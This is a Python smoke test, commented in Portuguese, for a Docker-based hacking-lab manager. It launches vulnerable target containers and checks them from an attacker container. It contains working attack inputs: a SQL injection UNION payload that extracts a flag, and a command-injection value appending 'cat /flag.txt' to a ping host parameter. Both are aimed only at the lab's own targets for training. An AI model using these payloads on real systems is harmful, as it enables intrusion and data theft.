#!/usr/bin/env python3
"""
Teste de fumaça do CyberLab — exercita o manager de ponta a ponta.

Roda de verdade contra o Docker local (cria e remove máquinas do lab).

    python tests/test_manager.py
"""
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from lab.manager import LabManager  # noqa: E402

CHECKS = []


def check(name: str, ok: bool, detail: str = "") -> None:
    CHECKS.append(ok)
    mark = "PASS" if ok else "FAIL"
    print(f"[{mark}] {name}" + (f" — {detail}" if detail else ""))


def main() -> int:
    m = LabManager()
    check("daemon docker acessível", m.ping())

    m.ensure_network()
    m.ensure_attacker()
    names = [m.spawn_target(k) for k in ("webvuln", "sshweak", "ftpanon")]
    time.sleep(3)

    machines = {mach.name: mach for mach in m.machines()}
    check("atacante presente e rodando",
          "cyberlab-attacker" in machines
          and machines["cyberlab-attacker"].status == "running")
    for n in names:
        check(f"{n} rodando com IP",
              n in machines and machines[n].status == "running" and machines[n].ip != "-")

    web_ip = machines[names[0]].ip
    ssh_ip = machines[names[1]].ip
    ftp_ip = machines[names[2]].ip

    out, code = m.exec("cyberlab-attacker", ["ping", "-c", "1", "-W", "2", web_ip])
    check("rede interna: atacante alcança webvuln", code == 0)

    out, code = m.exec("cyberlab-attacker", ["curl", "-s", "-m", "5", f"http://{web_ip}/"])
    check("webvuln responde HTTP", "WebVuln Shop" in out, out[:60].replace("\n", " "))

    exploit = "http://{0}/search?q=%25%27%20UNION%20SELECT%20flag%2C2%20FROM%20secrets--%20-"
    out, code = m.exec(
        "cyberlab-attacker", ["curl", "-s", "-m", "5", exploit.format(web_ip)]
    )
    check("SQLi (UNION) extrai a flag", "CYBERLAB{sql1_un10n_xtr4ct}" in out)

    out, code = m.exec(
        "cyberlab-attacker",
        ["curl", "-s", "-m", "5", f"http://{web_ip}/ping?host=127.0.0.1%3Bcat%20/flag.txt"],
    )
    check("command injection lê /flag.txt", "CYBERLAB{w3b_pwn3d_c0ngr4tz}" in out)

    out, code = m.exec("cyberlab-attacker", ["nc", "-z", "-w", "3", ssh_ip, "22"])
    check("sshweak com porta 22 aberta", code == 0)

    out, code = m.exec("cyberlab-attacker", ["curl", "-s", "-m", "5", f"ftp://{ftp_ip}/"])
    check("ftp anônimo lista arquivos", "flag.txt" in out or "passwords.txt" in out, out[:60])

    out, code = m.exec("cyberlab-attacker", ["ping", "-c", "1", "-W", "2", "8.8.8.8"])
    check("isolamento: SEM internet por padrão", code != 0)

    m.set_internet(True)
    out, code = m.exec("cyberlab-attacker", ["ping", "-c", "1", "-W", "3", "8.8.8.8"])
    check("toggle de internet liga NAT do atacante", code == 0)
    m.set_internet(False)
    out, code = m.exec("cyberlab-attacker", ["ping", "-c", "1", "-W", "2", "8.8.8.8"])
    check("toggle de internet desliga de novo", code != 0 and not m.internet_enabled())

    m.sample_stats()
    time.sleep(1.2)
    stats = m.sample_stats()
    check("métricas coletadas (cpu/ram por container)",
          "cyberlab-attacker" in stats and stats["cyberlab-attacker"][2] > 0,
          str(stats.get("cyberlab-attacker")))
    host = m.host_stats()
    check("métricas do host (psutil)", host["mem_total_gb"] > 0)

    # limpa o que o teste criou
    for n in names:
        m.destroy(n)
    left = {mach.name for mach in m.machines()}
    check("alvos destruídos ao final", not any(n in left for n in names))

    print(f"\n{sum(CHECKS)}/{len(CHECKS)} verificações passaram")
    return 0 if all(CHECKS) else 1


if __name__ == "__main__":
    raise SystemExit(main())
